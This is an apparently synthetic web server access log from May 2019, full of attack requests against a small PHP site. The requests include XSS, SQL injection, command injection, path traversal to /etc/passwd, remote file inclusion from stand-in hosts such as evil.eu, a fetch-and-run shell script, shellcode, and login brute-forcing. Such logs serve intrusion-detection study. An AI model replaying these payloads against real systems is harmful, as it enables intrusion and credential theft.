62.109.16.162 - - [18/May/2019:03:00:01 +0200] "GET /index.php/?post=%3script%3ealert(1); HTTP/1.1" 504 30042 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
69.46.0.142 - - [18/May/2019:03:00:02 +0200] "GET /orders.php/ HTTP/1.0" 200 79673 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:00:03 +0200] "GET /connection.php/ HTTP/1.1" 200 62945 "/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
54.36.149.94 - - [18/May/2019:03:00:04 +0200] "GET /index.php/ HTTP/1.0" 200 33380 "/orders.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.109.16.162 - - [18/May/2019:03:00:05 +0200] "GET /orders.php/?username=admin&password=1237 HTTP/1.0" 200 84936 "/login.php/" "Mozilla/5.0 (Android; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"
31.184.238.22 - - [18/May/2019:03:00:06 +0200] "GET /api/v1/login/ HTTP/1.1" 200 31558 "/page/about-us/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:00:06 +0200] "GET /api/v1/login/ HTTP/1.1" 200 38364 "/page/about-us/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:00:06 +0200] "GET /api/v1/login/ HTTP/1.1" 200 48345 "/page/about-us/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:00:06 +0200] "GET /api/v1/login/ HTTP/1.1" 200 53407 "/page/about-us/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:00:06 +0200] "GET /api/v1/login/ HTTP/1.1" 200 29260 "/page/about-us/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
62.109.16.162 - - [18/May/2019:03:00:11 +0200] "GET /?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 12709 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:12 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 65692 "/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:00:13 +0200] "GET /api/v1/register/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 200 60572 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:00:14 +0200] "GET /index.php/?file=http://evil.eu/sh HTTP/1.0" 200 21164 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
182.34.27.162 - - [18/May/2019:03:00:15 +0200] "GET /login.php/ HTTP/1.1" 403 78410 "/login.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:00:16 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 403 64329 "/core/files/js/upload.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
69.46.0.142 - - [18/May/2019:03:00:17 +0200] "GET /orders.php/ HTTP/1.0" 200 19222 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:00:18 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 56061 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:00:19 +0200] "GET /index.php/ HTTP/1.0" 404 10556 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:00:20 +0200] "GET /core/files/js/editor.js/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 6535 "/orders.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:21 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 403 46106 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:21 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 403 41008 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:21 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 403 76300 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:21 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 403 57525 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:21 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 403 34563 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
1.2.169.95 - - [18/May/2019:03:00:26 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 69382 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:00:27 +0200] "GET /index.php/?page=http://192.168.80.128/rfi.php HTTP/1.0" 200 11616 "/login.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.36.149.94 - - [18/May/2019:03:00:28 +0200] "GET /api/v1/register/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 32290 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:00:29 +0200] "GET /index.php/?post=%3script%3ealert(1); HTTP/1.1" 404 25587 "/orders.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:30 +0200] "GET / HTTP/1.0" 404 84707 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:30 +0200] "GET / HTTP/1.0" 404 79787 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:30 +0200] "GET / HTTP/1.0" 404 77077 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:30 +0200] "GET / HTTP/1.0" 404 38701 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:30 +0200] "GET / HTTP/1.0" 404 71210 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:35 +0200] "GET /core/files/js/editor.js/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 88045 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
86.125.112.230 - - [18/May/2019:03:00:36 +0200] "GET /orders.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 504 35067 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:00:37 +0200] "GET /login.php/?username=admin&password=1234 HTTP/1.0" 403 1249 "/register.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:00:38 +0200] "GET /api/v1/login/?username=admin&password=1235 HTTP/1.0" 200 34185 "/page/about-us/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:00:39 +0200] "GET /login.php/ HTTP/1.0" 200 39164 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:00:40 +0200] "GET /login.php/ HTTP/1.0" 200 44065 "/login.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:00:41 +0200] "GET / HTTP/1.0" 200 23943 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:00:42 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 63263 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:00:43 +0200] "GET /api/v1/register/ HTTP/1.0" 403 59621 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
220.243.135.5 - - [18/May/2019:03:00:44 +0200] "GET /index.php/ HTTP/1.0" 200 61207 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:45 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 71004 "/core/files/js/editor.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:45 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 69021 "/core/files/js/editor.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:45 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 64828 "/core/files/js/editor.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:45 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 6384 "/core/files/js/editor.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:45 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 74917 "/core/files/js/editor.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:00:50 +0200] "GET /update.php/?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.0" 200 52399 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [18/May/2019:03:00:51 +0200] "GET / HTTP/1.0" 200 34900 "/api/v1/register/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
45.61.164.120 - - [18/May/2019:03:00:52 +0200] "GET /orders.php/?username=admin&password=1238 HTTP/1.1" 504 5706 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
121.225.26.201 - - [18/May/2019:03:00:53 +0200] "GET /api/v1/register/ HTTP/1.0" 200 1905 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:00:54 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 200 61229 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [18/May/2019:03:00:55 +0200] "GET /index.php/ HTTP/1.0" 200 26175 "/index.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:00:56 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 200 62428 "/index.php/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:00:57 +0200] "GET /core/files/js/upload.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 65642 "/api/v1/login/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
182.34.27.162 - - [18/May/2019:03:00:58 +0200] "GET /orders.php/.well-known/assetlinks.json HTTP/1.1" 404 21973 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:00:59 +0200] "GET /index.php/?username=admin&password=1235 HTTP/1.0" 200 24713 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:01:00 +0200] "GET /register.php/ HTTP/1.0" 200 22230 "/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.133.212.79 - - [18/May/2019:03:01:01 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.0" 404 3300 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:01:02 +0200] "GET /api/v1/login/?username=admin&password=1234 HTTP/1.0" 400 15718 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:01:03 +0200] "GET / HTTP/1.0" 200 48265 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
220.243.135.5 - - [18/May/2019:03:01:04 +0200] "GET /index.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 404 87296 "/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:01:05 +0200] "GET /login.php/?id=0%20or%201=1 HTTP/1.0" 200 43145 "/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
45.61.164.120 - - [18/May/2019:03:01:06 +0200] "GET /register.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb+3\x88\xd2%z HTTP/1.0" 200 24709 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:01:07 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.1" 404 54322 "/index.php/" "Mozilla/5.0 (Mobile; OPENC; rv:40.0) Gecko/40.0 Firefox/40.0"
87.251.81.179 - - [18/May/2019:03:01:08 +0200] "GET /connection.php/?username=admin&password=admin HTTP/1.0" 200 38204 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:01:09 +0200] "GET /core/files/js/editor.js/?file=http://evil.eu/sh HTTP/1.0" 404 77154 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:01:10 +0200] "GET /connection.php/?file=http://evil.eu/sh HTTP/1.0" 200 28975 "/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:01:11 +0200] "GET /?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 404 84889 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:01:12 +0200] "GET /api/v1/register/?customerId=1OR%201=1 HTTP/1.0" 200 3370 "/api/v1/customers/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
115.221.121.44 - - [18/May/2019:03:01:13 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.0" 403 17174 "/xmlrpc.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:01:14 +0200] "GET /api/v1/login/ HTTP/1.0" 200 3492 "/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
31.184.238.22 - - [18/May/2019:03:01:15 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 63241 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
31.184.238.22 - - [18/May/2019:03:01:15 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 69619 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
31.184.238.22 - - [18/May/2019:03:01:15 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 88724 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
31.184.238.22 - - [18/May/2019:03:01:15 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 68814 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
31.184.238.22 - - [18/May/2019:03:01:15 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 27416 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
87.251.81.179 - - [18/May/2019:03:01:20 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 14470 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:01:21 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.1" 403 39308 "/api/v1/register/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
121.225.26.201 - - [18/May/2019:03:01:22 +0200] "GET /orders.php/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0" 200 49185 "/api/v1/orders/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:01:23 +0200] "GET /connection.php/%u0061?[buffer]=89898 HTTP/1.1" 200 52411 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:01:24 +0200] "GET /update.php/?id=0%20or%201=1 HTTP/1.0" 200 39643 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
86.125.112.230 - - [18/May/2019:03:01:25 +0200] "GET /?username=admin&password=admin HTTP/1.0" 404 59104 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:01:26 +0200] "GET /connection.php/ HTTP/1.0" 400 81981 "/register.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
54.36.149.52 - - [18/May/2019:03:01:27 +0200] "GET /update.php/?username=admin&password=password HTTP/1.0" 200 5353 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:01:28 +0200] "GET /update.php/ HTTP/1.0" 200 14842 "/api/v1/register/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:01:29 +0200] "GET /connection.php/?file=http://evil.eu/sh HTTP/1.1" 200 65459 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11"
62.109.16.162 - - [18/May/2019:03:01:30 +0200] "GET /index.php/.env/README.txt HTTP/1.0" 403 75355 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:01:31 +0200] "GET /core/files/js/editor.js/?id=0%20or%201=1 HTTP/1.0" 200 19495 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:01:32 +0200] "GET /index.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 45299 "/update.php/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
1.2.169.95 - - [18/May/2019:03:01:33 +0200] "GET /core/files/js/upload.js/?username=admin&password=1237 HTTP/1.0" 504 15741 "/register.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
115.221.121.44 - - [18/May/2019:03:01:34 +0200] "GET /register.php/.env/README.txt HTTP/1.0" 200 54030 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:01:35 +0200] "GET /index.php/?username=admin&password=password HTTP/1.0" 403 33124 "/api/v1/register/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:01:36 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.1" 404 2860 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:01:37 +0200] "GET /api/v1/login/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 404 69131 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:01:38 +0200] "GET /login.php/?username=admin&password=1234 HTTP/1.0" 200 82530 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:01:39 +0200] "GET /blog/our-proposals/?username=admin&password=1234 HTTP/1.0" 404 75784 "/api/v1/login/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
182.34.27.162 - - [18/May/2019:03:01:40 +0200] "GET /core/files/js/editor.js/?ip=|+ls+-l HTTP/1.1" 200 3928 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
5.13.35.65 - - [18/May/2019:03:01:41 +0200] "GET /connection.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 403 44252 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:01:42 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 200 46427 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
